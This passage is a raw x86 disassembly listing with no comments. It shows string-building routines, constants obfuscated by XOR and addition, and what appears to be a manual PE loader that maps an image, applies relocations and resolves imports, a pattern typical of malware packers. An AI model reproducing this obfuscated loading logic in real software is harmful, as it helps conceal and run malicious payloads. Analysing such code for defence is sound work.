  425755:	mov    DWORD PTR [ebp-0x4],eax
  425758:	push   esi
  425759:	mov    esi,DWORD PTR [ebp-0x4]
  42575c:	mov    eax,0xf881bacf
  425761:	mov    DWORD PTR [esi],eax
  425763:	mov    esi,DWORD PTR [ebp-0x8]
  425766:	cmp    esi,eax
  425768:	pop    esi
  425769:	jne    0x425773
  42576b:	mov    BYTE PTR [ecx+0xa],0x7b
  42576f:	mov    BYTE PTR [edx+0x8],0xce
  425773:	mov    BYTE PTR [edx+0xa],0x7b
  425777:	mov    BYTE PTR [ecx+0x2],0xe9
  42577b:	leave  
  42577c:	ret    
  42577d:	push   ebp
  42577e:	mov    ebp,esp
  425780:	push   ecx
  425781:	push   ecx
  425782:	lea    eax,[ebp-0x8]
  425785:	mov    DWORD PTR [ebp-0x4],eax
  425788:	mov    edx,DWORD PTR [ebp-0x4]
  42578b:	mov    eax,0xf88b0bd3
  425790:	mov    DWORD PTR [edx],eax
  425792:	mov    edx,DWORD PTR [ebp-0x8]
  425795:	cmp    edx,eax
  425797:	jne    0x4257a8
  425799:	mov    eax,DWORD PTR [ebp+0x8]
  42579c:	mov    BYTE PTR [ecx+0x9],0xef
  4257a0:	mov    BYTE PTR [eax+0x7],0xa6
  4257a4:	mov    BYTE PTR [ecx+0x6],0xee
  4257a8:	mov    BYTE PTR [ecx+0x3],0xdf
  4257ac:	leave  
  4257ad:	ret    0x4
  4257b0:	push   ebp
  4257b1:	mov    ebp,esp
  4257b3:	push   ecx
  4257b4:	push   ecx
  4257b5:	lea    eax,[ebp-0x8]
  4257b8:	mov    DWORD PTR [ebp-0x4],eax
  4257bb:	mov    edx,DWORD PTR [ebp-0x4]
  4257be:	mov    eax,0x7e0dacf
  4257c3:	mov    DWORD PTR [edx],eax
  4257c5:	mov    edx,DWORD PTR [ebp-0x8]
  4257c8:	cmp    edx,eax
  4257ca:	jne    0x4257d0
  4257cc:	mov    BYTE PTR [ecx+0x7],0xa6
  4257d0:	mov    eax,DWORD PTR [ebp+0x8]
  4257d3:	mov    BYTE PTR [ecx+0x1],0xe4
  4257d7:	mov    BYTE PTR [eax+0x9],0xcf
  4257db:	leave  
  4257dc:	ret    0x4
  4257df:	push   ebp
  4257e0:	mov    ebp,esp
  4257e2:	push   ecx
  4257e3:	push   ecx
  4257e4:	lea    eax,[ebp-0x8]
  4257e7:	mov    DWORD PTR [ebp-0x4],eax
  4257ea:	push   esi
  4257eb:	mov    esi,DWORD PTR [ebp-0x4]
  4257ee:	mov    eax,0x7060e3e
  4257f3:	mov    DWORD PTR [esi],eax
  4257f5:	mov    esi,DWORD PTR [ebp-0x8]
  4257f8:	cmp    esi,eax
  4257fa:	pop    esi
  4257fb:	jne    0x425807
  4257fd:	mov    BYTE PTR [edx+0x4],0xea
  425801:	mov    WORD PTR [ecx+0x3],0xeadf
  425807:	mov    BYTE PTR [edx],0xbe
  42580a:	leave  
  42580b:	ret    
  42580c:	push   ebp
  42580d:	mov    ebp,esp
  42580f:	push   ecx
  425810:	push   ecx
  425811:	lea    eax,[ebp-0x8]
  425814:	mov    DWORD PTR [ebp-0x4],eax
  425817:	mov    edx,DWORD PTR [ebp-0x4]
  42581a:	mov    eax,0xf8870b3f
  42581f:	mov    DWORD PTR [edx],eax
  425821:	mov    edx,DWORD PTR [ebp-0x8]
  425824:	cmp    edx,eax
  425826:	jne    0x425833
  425828:	mov    eax,DWORD PTR [ebp+0x8]
  42582b:	mov    BYTE PTR [ecx+0x8],0xee
  42582f:	mov    BYTE PTR [eax+0x1],0xe4
  425833:	mov    BYTE PTR [ecx+0x5],0xf2
  425837:	leave  
  425838:	ret    0x4
  42583b:	push   esi
  42583c:	mov    ecx,edi
  42583e:	call   0x42580c
  425843:	mov    edx,edi
  425845:	mov    ecx,esi
  425847:	mov    BYTE PTR [esi],0xde
  42584a:	call   0x4257df
  42584f:	push   esi
  425850:	mov    ecx,edi
  425852:	mov    BYTE PTR [esi+0x5],0xf2
  425856:	call   0x4257b0
  42585b:	push   esi
  42585c:	mov    BYTE PTR [esi+0x6],0xee
  425860:	call   0x42577d
  425865:	mov    BYTE PTR [esi+0x2],0xe9
  425869:	mov    edx,esi
  42586b:	jmp    0x42574d
  425870:	push   ebp
  425871:	mov    ebp,esp
  425873:	push   ecx
  425874:	mov    ecx,DWORD PTR [edx+0x194]
  42587a:	push   esi
  42587b:	mov    esi,DWORD PTR [ebp+0x8]
  42587e:	mov    esi,DWORD PTR [esi]
  425880:	mov    DWORD PTR [ecx],esi
  425882:	mov    ecx,DWORD PTR [edx+0x194]
  425888:	mov    ecx,DWORD PTR [ecx]
  42588a:	mov    esi,DWORD PTR [edx+0x190]
  425890:	mov    DWORD PTR [esi],ecx
  425892:	mov    eax,DWORD PTR [edx+0x194]
  425898:	mov    ecx,DWORD PTR [eax]
  42589a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42589d:	add    ecx,DWORD PTR [eax]
  42589f:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  4258a6:	mov    eax,DWORD PTR [ebp-0x4]
  4258a9:	movzx  ecx,WORD PTR [ecx+0x16]
  4258ad:	xor    eax,0x75108b1
  4258b2:	add    eax,0x3272f8
  4258b7:	pop    esi
  4258b8:	test   ecx,eax
  4258ba:	je     0x4258c8
  4258bc:	mov    eax,DWORD PTR [edx+0x1c8]
  4258c2:	mov    DWORD PTR [eax],0xf89c85b8
  4258c8:	leave  
  4258c9:	ret    0x4
  4258cc:	push   ebp
  4258cd:	mov    ebp,esp
  4258cf:	sub    esp,0x70
  4258d2:	and    DWORD PTR [ebp-0x20],0x0
  4258d6:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  4258dd:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  4258e4:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  4258eb:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4258f2:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  4258f9:	mov    eax,DWORD PTR [ebp+0x20]
  4258fc:	mov    eax,DWORD PTR [eax+0x194]
  425902:	mov    DWORD PTR [ebp-0xc],eax
  425905:	mov    eax,DWORD PTR [ebp+0x20]
  425908:	push   ebx
  425909:	push   esi
  42590a:	mov    esi,DWORD PTR [eax+0x190]
  425910:	mov    eax,DWORD PTR [ebp+0x20]
  425913:	mov    eax,DWORD PTR [eax+0x18c]
  425919:	mov    DWORD PTR [ebp-0x8],eax
  42591c:	mov    eax,DWORD PTR [eax]
  42591e:	push   edi
  42591f:	mov    DWORD PTR [ebp-0x4],esi
  425922:	test   eax,eax
  425924:	jne    0x425931
  425926:	push   DWORD PTR [ebp+0x1c]
  425929:	mov    edx,DWORD PTR [ebp+0x20]
  42592c:	call   0x425870
  425931:	mov    eax,DWORD PTR [esi]
  425933:	mov    ebx,DWORD PTR [esi]
  425935:	add    ebx,DWORD PTR [eax+0x3c]
  425938:	mov    eax,DWORD PTR [ebp+0xc]
  42593b:	mov    ecx,DWORD PTR [ebp-0x8]
  42593e:	mov    ecx,DWORD PTR [ecx]
  425940:	mov    esi,0x75108b1
  425945:	xor    eax,esi
  425947:	mov    edi,0x3272f8
  42594c:	add    eax,edi
  42594e:	cmp    eax,ecx
  425950:	jne    0x425b88
  425956:	mov    eax,DWORD PTR [ebp-0xc]
  425959:	mov    eax,DWORD PTR [eax]
  42595b:	mov    DWORD PTR [ebp-0x10],eax
  42595e:	mov    eax,DWORD PTR [ebx+0x50]
  425961:	mov    DWORD PTR [ebp-0x68],eax
  425964:	mov    eax,DWORD PTR [ebp-0x18]
  425967:	xor    eax,esi
  425969:	add    eax,edi
  42596b:	mov    DWORD PTR [ebp-0x64],eax
  42596e:	mov    eax,DWORD PTR [ebp-0x14]
  425971:	and    DWORD PTR [ebp-0x6c],0x0
  425975:	xor    eax,esi
  425977:	add    eax,edi
  425979:	mov    DWORD PTR [ebp-0x60],eax
  42597c:	lea    eax,[ebp-0x70]
  42597f:	push   eax
  425980:	mov    eax,DWORD PTR [ebp+0x8]
  425983:	xor    eax,esi
  425985:	add    eax,edi
  425987:	push   eax
  425988:	mov    eax,DWORD PTR [ebp+0x20]
  42598b:	add    eax,0xaa
  425990:	push   eax
  425991:	mov    eax,DWORD PTR [ebp+0x20]
  425994:	mov    eax,DWORD PTR [eax+0x198]
  42599a:	mov    DWORD PTR [ebp-0x70],0x4
  4259a1:	push   DWORD PTR [eax]
  4259a3:	mov    eax,DWORD PTR [ebp+0x10]
  4259a6:	call   eax
  4259a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4259ab:	mov    ecx,DWORD PTR [ecx]
  4259ad:	mov    edx,DWORD PTR [ebp-0x8]
  4259b0:	mov    DWORD PTR [ebp-0x6c],eax
  4259b3:	mov    DWORD PTR [ebp+0x1c],eax
  4259b6:	mov    DWORD PTR [edx],ecx
  4259b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4259bb:	mov    DWORD PTR [ecx],eax
  4259bd:	mov    eax,DWORD PTR [ebx+0x50]
  4259c0:	mov    DWORD PTR [ebp-0x68],eax
  4259c3:	mov    eax,DWORD PTR [ebp-0x1c]
  4259c6:	xor    eax,esi
  4259c8:	add    eax,edi
  4259ca:	mov    DWORD PTR [ebp-0x64],eax
  4259cd:	lea    eax,[ebp-0x20]
  4259d0:	mov    DWORD PTR [ebp-0x60],eax
  4259d3:	lea    eax,[ebp-0x70]
  4259d6:	push   eax
  4259d7:	mov    eax,DWORD PTR [ebp+0x8]
  4259da:	xor    eax,esi
  4259dc:	add    eax,edi
  4259de:	push   eax
  4259df:	mov    eax,DWORD PTR [ebp+0x20]
  4259e2:	add    eax,0xee
  4259e7:	push   eax
  4259e8:	mov    eax,DWORD PTR [ebp+0x20]
  4259eb:	mov    eax,DWORD PTR [eax+0x198]
  4259f1:	mov    DWORD PTR [ebp-0x70],0x4
  4259f8:	push   DWORD PTR [eax]
  4259fa:	mov    eax,DWORD PTR [ebp+0x10]
  4259fd:	call   eax
  4259ff:	test   eax,eax
  425a01:	je     0x425a26
  425a03:	and    DWORD PTR [ebp+0xc],0x0
  425a07:	cmp    DWORD PTR [ebx+0x50],0x0
  425a0b:	jbe    0x425a26
  425a0d:	mov    eax,DWORD PTR [ebp+0x1c]
  425a10:	mov    ecx,DWORD PTR [ebp-0x10]
  425a13:	sub    ecx,eax
  425a15:	mov    dl,BYTE PTR [ecx+eax*1]
  425a18:	inc    DWORD PTR [ebp+0xc]
  425a1b:	mov    BYTE PTR [eax],dl
  425a1d:	mov    edx,DWORD PTR [ebp+0xc]
  425a20:	inc    eax
  425a21:	cmp    edx,DWORD PTR [ebx+0x50]
  425a24:	jb     0x425a15
  425a26:	mov    edx,DWORD PTR [ebp+0x1c]
  425a29:	mov    ecx,DWORD PTR [edx+0x3c]
  425a2c:	add    ecx,edx
  425a2e:	mov    eax,DWORD PTR [ecx+0xa0]
  425a34:	mov    ebx,DWORD PTR [ecx+0x28]
  425a37:	add    eax,edx
  425a39:	sub    edx,DWORD PTR [ebp-0x10]
  425a3c:	add    ebx,DWORD PTR [ebp+0x1c]
  425a3f:	mov    DWORD PTR [ebp+0xc],edx
  425a42:	mov    DWORD PTR [ebp-0x2c],ecx
  425a45:	mov    DWORD PTR [ebp-0x14],ebx
  425a48:	mov    DWORD PTR [ebp-0x8],0x0
  425a4f:	jmp    0x425acb
  425a51:	add    edx,0xfffffff8
  425a54:	shr    edx,1
  425a56:	mov    DWORD PTR [ebp-0x18],edx
  425a59:	je     0x425ab7
  425a5b:	lea    edx,[eax+0x8]
  425a5e:	mov    DWORD PTR [ebp-0x4],edx
  425a61:	mov    edx,DWORD PTR [ebp-0x18]
  425a64:	mov    DWORD PTR [ebp-0x18],edx
  425a67:	mov    edx,DWORD PTR [ebp-0x4]
  425a6a:	movzx  edx,WORD PTR [edx]
  425a6d:	mov    DWORD PTR [ebp-0x24],edx
  425a70:	and    edx,0xfff
  425a76:	mov    DWORD PTR [ebp-0x28],edx
  425a79:	mov    edx,DWORD PTR [ebp-0x24]
  425a7c:	shr    edx,0xc
  425a7f:	add    edx,0xffcd8d08
  425a85:	xor    edx,esi
  425a87:	cmp    edx,0xf89c85ba
  425a8d:	jne    0x425aae
  425a8f:	mov    edx,DWORD PTR [ebp-0x28]
  425a92:	add    edx,DWORD PTR [ebp+0x1c]
  425a95:	mov    ebx,DWORD PTR [eax]
  425a97:	cmp    DWORD PTR [ebx+edx*1],0x0
  425a9b:	je     0x425aab
  425a9d:	mov    ecx,DWORD PTR [ebp+0xc]
  425aa0:	add    ecx,DWORD PTR [ebx+edx*1]
  425aa3:	mov    ebx,DWORD PTR [eax]
  425aa5:	mov    DWORD PTR [edx+ebx*1],ecx
  425aa8:	mov    ecx,DWORD PTR [ebp-0x2c]
  425aab:	mov    ebx,DWORD PTR [ebp-0x14]
  425aae:	add    DWORD PTR [ebp-0x4],0x2
  425ab2:	dec    DWORD PTR [ebp-0x18]
  425ab5:	jne    0x425a67
  425ab7:	mov    edx,DWORD PTR [ebp-0xc]
  425aba:	add    DWORD PTR [ebp-0x8],edx
  425abd:	mov    edx,DWORD PTR [ebp-0x8]
  425ac0:	cmp    edx,DWORD PTR [ecx+0xa4]
  425ac6:	jae    0x425ad9
  425ac8:	add    eax,DWORD PTR [ebp-0xc]
  425acb:	mov    edx,DWORD PTR [eax+0x4]
  425ace:	mov    DWORD PTR [ebp-0xc],edx
  425ad1:	test   edx,edx
  425ad3:	jne    0x425a51
  425ad9:	mov    eax,DWORD PTR [ebp-0x10]
  425adc:	mov    DWORD PTR [ebp-0x6c],eax
  425adf:	mov    DWORD PTR [ebp-0x70],0x4
  425ae6:	mov    eax,DWORD PTR [ecx+0x50]
  425ae9:	mov    DWORD PTR [ebp-0x68],eax
  425aec:	mov    eax,DWORD PTR [ebp-0x1c]
  425aef:	xor    eax,esi
  425af1:	add    eax,edi
  425af3:	mov    DWORD PTR [ebp-0x64],eax
  425af6:	lea    eax,[ebp-0x20]
  425af9:	mov    DWORD PTR [ebp-0x60],eax
  425afc:	lea    eax,[ebp-0x70]
  425aff:	push   eax
  425b00:	mov    eax,DWORD PTR [ebp+0x8]
  425b03:	xor    eax,esi
  425b05:	add    eax,edi
  425b07:	push   eax
  425b08:	mov    eax,DWORD PTR [ebp+0x20]
  425b0b:	add    eax,0xee
  425b10:	push   eax
  425b11:	mov    eax,DWORD PTR [ebp+0x20]
  425b14:	mov    eax,DWORD PTR [eax+0x198]
  425b1a:	push   DWORD PTR [eax]
  425b1c:	mov    eax,DWORD PTR [ebp+0x10]
  425b1f:	call   eax
  425b21:	mov    eax,DWORD PTR [ebp+0x20]
  425b24:	mov    eax,DWORD PTR [eax+0x180]
  425b2a:	add    eax,DWORD PTR [ebp+0xc]
  425b2d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b30:	push   DWORD PTR [ebp+0x18]
  425b33:	mov    DWORD PTR [eax],ecx
  425b35:	push   DWORD PTR [ebp+0x14]
  425b38:	push   DWORD PTR [ebp+0x1c]
  425b3b:	call   ebx
  425b3d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b40:	add    ecx,DWORD PTR [ebp+0x20]
  425b43:	lea    eax,[ebp+0x4]
  425b46:	mov    DWORD PTR [ebp+0x20],ecx
  425b49:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4c:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4f:	mov    edx,DWORD PTR [ecx+0x190]
  425b55:	mov    ecx,DWORD PTR [ebp+0x20]
  425b58:	mov    ecx,DWORD PTR [ecx+0x18c]
  425b5e:	mov    esi,DWORD PTR [ecx]
  425b60:	cmp    DWORD PTR [eax],esi
  425b62:	jb     0x425b83
  425b64:	mov    esi,DWORD PTR [edx]
  425b66:	mov    edi,DWORD PTR [edx]
  425b68:	mov    esi,DWORD PTR [esi+0x3c]
  425b6b:	lea    esi,[edi+esi*1+0x50]
  425b6f:	mov    edi,DWORD PTR [ecx]
  425b71:	add    edi,DWORD PTR [esi]
  425b73:	cmp    DWORD PTR [eax],edi
  425b75:	jae    0x425b83
  425b77:	mov    esi,DWORD PTR [ecx]
  425b79:	mov    ecx,DWORD PTR [eax]
  425b7b:	mov    edx,DWORD PTR [edx]
  425b7d:	sub    ecx,esi
  425b7f:	add    edx,ecx
  425b81:	mov    DWORD PTR [eax],edx
  425b83:	mov    eax,DWORD PTR [ebp+0xc]
  425b86:	jmp    0x425b8a
  425b88:	xor    eax,eax
  425b8a:	pop    edi
  425b8b:	pop    esi
  425b8c:	pop    ebx
  425b8d:	leave  
  425b8e:	ret    0x1c
  425b91:	push   ebp
  425b92:	mov    ebp,esp
  425b94:	sub    esp,0x1c
  425b97:	push   esi
  425b98:	mov    esi,eax
  425b9a:	mov    eax,DWORD PTR [ecx+0x190]
  425ba0:	cmp    DWORD PTR [eax],0x0
  425ba3:	je     0x425cb3
  425ba9:	test   edx,edx
  425bab:	je     0x425cb3
  425bb1:	test   esi,esi
  425bb3:	je     0x425cb3
  425bb9:	mov    eax,DWORD PTR [esi+0x88]
  425bbf:	test   eax,eax
  425bc1:	je     0x425cae
  425bc7:	cmp    DWORD PTR [esi+0x8c],0x10
  425bce:	je     0x425cae
  425bd4:	cmp    DWORD PTR [esi+0x34],edx
  425bd7:	je     0x425cae
  425bdd:	mov    esi,DWORD PTR [ecx+0x18c]
  425be3:	and    DWORD PTR [ebp-0x10],0x0
  425be7:	mov    ecx,edx
  425be9:	sub    ecx,DWORD PTR [esi]
  425beb:	add    eax,edx
  425bed:	movzx  edx,WORD PTR [eax+0xc]
  425bf1:	mov    DWORD PTR [ebp-0x1c],ecx
  425bf4:	movzx  ecx,WORD PTR [eax+0xe]
  425bf8:	add    ecx,edx
  425bfa:	je     0x425cae
  425c00:	lea    ecx,[eax+0x14]
  425c03:	push   ebx
  425c04:	mov    DWORD PTR [ebp-0x18],ecx
  425c07:	mov    esi,0x7fffffff
  425c0c:	push   edi
  425c0d:	test   DWORD PTR [ecx],esi
  425c0f:	je     0x425c90
  425c11:	mov    edx,DWORD PTR [ecx]
  425c13:	and    DWORD PTR [ebp-0xc],0x0
  425c17:	and    edx,esi
  425c19:	add    edx,eax
  425c1b:	movzx  edi,WORD PTR [edx+0xe]
  425c1f:	movzx  ebx,WORD PTR [edx+0xc]
  425c23:	add    edi,ebx
  425c25:	je     0x425c90
  425c27:	lea    ecx,[edx+0x14]
  425c2a:	mov    DWORD PTR [ebp-0x14],ecx
  425c2d:	test   DWORD PTR [ecx],esi
  425c2f:	je     0x425c72
  425c31:	mov    ecx,DWORD PTR [ecx]
  425c33:	and    DWORD PTR [ebp-0x8],0x0
  425c37:	and    ecx,esi
  425c39:	add    ecx,eax
  425c3b:	movzx  edi,WORD PTR [ecx+0xe]
  425c3f:	movzx  ebx,WORD PTR [ecx+0xc]
  425c43:	add    edi,ebx
  425c45:	je     0x425c72
  425c47:	lea    edi,[ecx+0x14]
  425c4a:	mov    DWORD PTR [ebp-0x4],edi
  425c4d:	mov    edi,DWORD PTR [ebp-0x4]
  425c50:	mov    edi,DWORD PTR [edi]
  425c52:	test   edi,edi
  425c54:	je     0x425c5c
  425c56:	mov    ebx,DWORD PTR [ebp-0x1c]
  425c59:	add    DWORD PTR [edi+eax*1],ebx
  425c5c:	movzx  edi,WORD PTR [ecx+0xe]
  425c60:	movzx  ebx,WORD PTR [ecx+0xc]
  425c64:	inc    DWORD PTR [ebp-0x8]
  425c67:	add    DWORD PTR [ebp-0x4],0x8
  425c6b:	add    edi,ebx
  425c6d:	cmp    DWORD PTR [ebp-0x8],edi
  425c70:	jb     0x425c4d
  425c72:	movzx  edi,WORD PTR [edx+0xe]
  425c76:	movzx  ebx,WORD PTR [edx+0xc]
  425c7a:	mov    ecx,DWORD PTR [ebp-0x14]
  425c7d:	inc    DWORD PTR [ebp-0xc]
  425c80:	add    ecx,0x8
  425c83:	add    edi,ebx
  425c85:	mov    DWORD PTR [ebp-0x14],ecx
  425c88:	cmp    DWORD PTR [ebp-0xc],edi
  425c8b:	jb     0x425c2d
  425c8d:	mov    ecx,DWORD PTR [ebp-0x18]
  425c90:	movzx  edx,WORD PTR [eax+0xe]
  425c94:	movzx  edi,WORD PTR [eax+0xc]
  425c98:	inc    DWORD PTR [ebp-0x10]
  425c9b:	add    ecx,0x8
  425c9e:	add    edx,edi
  425ca0:	mov    DWORD PTR [ebp-0x18],ecx
  425ca3:	cmp    DWORD PTR [ebp-0x10],edx
  425ca6:	jb     0x425c0d
  425cac:	pop    edi
  425cad:	pop    ebx
  425cae:	xor    eax,eax
  425cb0:	inc    eax
  425cb1:	jmp    0x425cb5
  425cb3:	xor    eax,eax
  425cb5:	pop    esi
  425cb6:	leave  
  425cb7:	ret    
  425cb8:	push   ebp
  425cb9:	mov    ebp,esp
  425cbb:	mov    ecx,DWORD PTR [ecx+0x190]
  425cc1:	mov    eax,DWORD PTR [ebp+0xc]
  425cc4:	sub    esp,0x10
  425cc7:	push   ebx
  425cc8:	xor    ebx,ebx
  425cca:	push   esi
  425ccb:	push   edi
  425ccc:	cmp    DWORD PTR [ecx],ebx
  425cce:	je     0x425d56
  425cd4:	cmp    eax,ebx
  425cd6:	je     0x425d56
  425cd8:	cmp    DWORD PTR [eax+0x78],ebx
  425cdb:	jne    0x425ce2
  425cdd:	xor    eax,eax
  425cdf:	inc    eax
  425ce0:	jmp    0x425d58
  425ce2:	mov    eax,DWORD PTR [eax+0x78]
  425ce5:	add    eax,DWORD PTR [ebp+0x8]
  425ce8:	mov    ecx,DWORD PTR [eax+0x1c]
  425ceb:	mov    edx,DWORD PTR [eax+0x24]
  425cee:	mov    esi,DWORD PTR [eax+0x14]
  425cf1:	mov    edi,DWORD PTR [eax+0x18]
  425cf4:	add    ecx,DWORD PTR [ebp+0x8]
  425cf7:	add    edx,DWORD PTR [ebp+0x8]
  425cfa:	mov    DWORD PTR [ebp-0x4],esi
  425cfd:	cmp    esi,edi
  425cff:	ja     0x425d04
  425d01:	mov    DWORD PTR [ebp-0x4],edi
  425d04:	mov    DWORD PTR [ebp-0x8],ebx
  425d07:	cmp    DWORD PTR [ebp-0x4],ebx
  425d0a:	jbe    0x425cdd
  425d0c:	cmp    ebx,DWORD PTR [eax+0x14]
  425d0f:	jae    0x425d17
  425d11:	movzx  esi,WORD PTR [edx+ebx*2]
  425d15:	jmp    0x425d19
  425d17:	mov    esi,ebx
  425d19:	lea    esi,[ecx+esi*4]
  425d1c:	mov    edi,DWORD PTR [esi]
  425d1e:	test   edi,edi
  425d20:	je     0x425d4b
  425d22:	add    edi,DWORD PTR [ebp+0x8]
  425d25:	mov    DWORD PTR [ebp-0x10],edi
  425d28:	cmp    edi,eax
  425d2a:	jbe    0x425d3c
  425d2c:	mov    ebx,DWORD PTR [ebp+0xc]
  425d2f:	mov    ebx,DWORD PTR [ebx+0x7c]
  425d32:	add    ebx,eax
  425d34:	cmp    edi,ebx
  425d36:	jae    0x425d3c
  425d38:	mov    esi,DWORD PTR [esi]
  425d3a:	jmp    0x425d44
  425d3c:	sub    edi,DWORD PTR [ebp+0x8]
  425d3f:	mov    DWORD PTR [esi],edi
  425d41:	mov    esi,DWORD PTR [ebp-0x10]
  425d44:	test   esi,esi
  425d46:	je     0x425d56
  425d48:	mov    ebx,DWORD PTR [ebp-0x8]
  425d4b:	inc    ebx
  425d4c:	mov    DWORD PTR [ebp-0x8],ebx
  425d4f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425d52:	jb     0x425d0c
  425d54:	jmp    0x425cdd
  425d56:	xor    eax,eax
  425d58:	pop    edi
  425d59:	pop    esi
  425d5a:	pop    ebx
  425d5b:	leave  
  425d5c:	ret    0x8
  425d5f:	push   ebp
  425d60:	mov    ebp,esp
  425d62:	sub    esp,0x2c
  425d65:	mov    edx,0xf89c85b9
  425d6a:	mov    DWORD PTR [ebp-0x4],edx
  425d6d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  425d74:	mov    eax,DWORD PTR [ebp-0x4]
  425d77:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7a:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7d:	mov    ecx,DWORD PTR [ebp-0x4]
  425d80:	mov    ecx,DWORD PTR [ebp-0x4]
  425d83:	mov    ecx,DWORD PTR [ebp-0x4]
  425d86:	push   ebx
  425d87:	mov    ebx,DWORD PTR [ebp+0x10]
  425d8a:	push   esi
  425d8b:	mov    esi,0x75108b1
  425d90:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  425d97:	mov    ecx,DWORD PTR [ebp-0x4]
  425d9a:	mov    ebx,DWORD PTR [ebx+0x190]
  425da0:	push   edi
  425da1:	mov    edi,0x3272f8
  425da6:	xor    ecx,esi
  425da8:	xor    eax,esi
  425daa:	add    eax,edi
  425dac:	add    ecx,edi
  425dae:	mov    DWORD PTR [ebp-0x18],eax
  425db1:	cmp    ecx,DWORD PTR [ebx]
  425db3:	je     0x426034
  425db9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dbc:	mov    ecx,DWORD PTR [ebp+0xc]
  425dbf:	xor    ebx,esi
  425dc1:	add    ebx,edi
  425dc3:	cmp    ebx,ecx
  425dc5:	je     0x426034
  425dcb:	mov    ebx,DWORD PTR [ebp-0x4]
  425dce:	mov    ecx,DWORD PTR [ecx+0x80]
  425dd4:	xor    ebx,esi
  425dd6:	add    ebx,edi
  425dd8:	cmp    ecx,ebx
  425dda:	je     0x42602f
  425de0:	add    ecx,DWORD PTR [ebp+0x8]
  425de3:	mov    DWORD PTR [ebp-0x2c],ecx
  425de6:	mov    ebx,edx
  425de8:	xor    ebx,esi
  425dea:	add    ebx,edi
  425dec:	mov    DWORD PTR [ebp-0x10],ebx
  425def:	mov    ebx,DWORD PTR [ebp-0x10]
  425df2:	cmp    ebx,edx
  425df4:	je     0x425e08
  425df6:	mov    edx,DWORD PTR [ebp-0x10]
  425df9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dfc:	imul   edx,edx,0x14
  425dff:	xor    ebx,esi
  425e01:	add    ebx,edi
  425e03:	cmp    DWORD PTR [edx+ecx*1],ebx
  425e06:	jne    0x425e1f
  425e08:	mov    edx,DWORD PTR [ebp-0x10]
  425e0b:	mov    ebx,DWORD PTR [ebp-0x4]
  425e0e:	imul   edx,edx,0x14
  425e11:	xor    ebx,esi
  425e13:	add    ebx,edi
  425e15:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425e19:	je     0x426021
  425e1f:	mov    eax,DWORD PTR [ebp-0x4]
  425e22:	mov    ebx,DWORD PTR [ebp-0x4]
  425e25:	mov    eax,DWORD PTR [ebp-0x10]
  425e28:	imul   eax,eax,0x14
  425e2b:	add    eax,ecx
  425e2d:	mov    ecx,DWORD PTR [eax+0x10]
  425e30:	add    ecx,DWORD PTR [ebp+0x8]
  425e33:	xor    ebx,esi
  425e35:	mov    DWORD PTR [ebp-0x1c],ecx
  425e38:	mov    ecx,DWORD PTR [ebp-0x4]
  425e3b:	mov    edx,DWORD PTR [ebp-0x4]
  425e3e:	xor    ecx,esi
  425e40:	add    ecx,edi
  425e42:	xor    edx,esi
  425e44:	mov    DWORD PTR [ebp-0x24],ecx
  425e47:	mov    ecx,DWORD PTR [eax]
  425e49:	add    edx,edi
  425e4b:	add    ebx,edi
  425e4d:	cmp    ecx,edx
  425e4f:	je     0x425e57
  425e51:	add    ecx,DWORD PTR [ebp+0x8]
  425e54:	mov    DWORD PTR [ebp-0x24],ecx
  425e57:	mov    ecx,DWORD PTR [ebp-0x4]
  425e5a:	xor    ecx,esi
  425e5c:	add    ecx,DWORD PTR [eax+0xc]
  425e5f:	mov    eax,DWORD PTR [ebp+0x8]
  425e62:	lea    eax,[ecx+eax*1+0x3272f8]
  425e69:	mov    DWORD PTR [ebp+0xc],eax
  425e6c:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  425e73:	mov    eax,DWORD PTR [ebp+0x10]
  425e76:	push   DWORD PTR [ebp+0xc]
  425e79:	mov    eax,DWORD PTR [eax+0x1e0]
  425e7f:	call   DWORD PTR [eax]
  425e81:	mov    ecx,DWORD PTR [ebp-0x4]
  425e84:	xor    ecx,esi
  425e86:	add    ecx,edi
  425e88:	mov    DWORD PTR [ebp-0xc],eax
  425e8b:	cmp    ecx,eax
  425e8d:	jne    0x425ea1
  425e8f:	mov    eax,DWORD PTR [ebp+0x10]
  425e92:	push   DWORD PTR [ebp+0xc]
  425e95:	mov    eax,DWORD PTR [eax+0x1e0]
  425e9b:	call   DWORD PTR [eax+0xc]
  425e9e:	mov    DWORD PTR [ebp-0xc],eax
  425ea1:	mov    DWORD PTR [ebp-0x20],0x7f661b30
  425ea8:	mov    DWORD PTR [ebp-0x20],0xf89c9840
  425eaf:	mov    eax,DWORD PTR [ebp-0x4]
  425eb2:	xor    eax,esi
  425eb4:	add    eax,edi
  425eb6:	cmp    eax,DWORD PTR [ebp-0xc]
  425eb9:	jne    0x425ede
  425ebb:	mov    eax,DWORD PTR [ebp-0x8]
  425ebe:	mov    ecx,DWORD PTR [ebp-0x20]
  425ec1:	xor    eax,esi
  425ec3:	xor    ecx,esi
  425ec5:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ecc:	mov    eax,DWORD PTR [ebp+0x10]
  425ecf:	mov    eax,DWORD PTR [eax+0x1e0]
  425ed5:	add    ecx,edi
  425ed7:	imul   ecx,ebx
  425eda:	push   ecx
  425edb:	call   DWORD PTR [eax+0x24]
  425ede:	mov    eax,DWORD PTR [ebp-0x4]
  425ee1:	xor    eax,esi
  425ee3:	add    eax,edi
  425ee5:	cmp    eax,DWORD PTR [ebp-0xc]
  425ee8:	jne    0x425ef9
  425eea:	mov    eax,DWORD PTR [ebp-0x28]
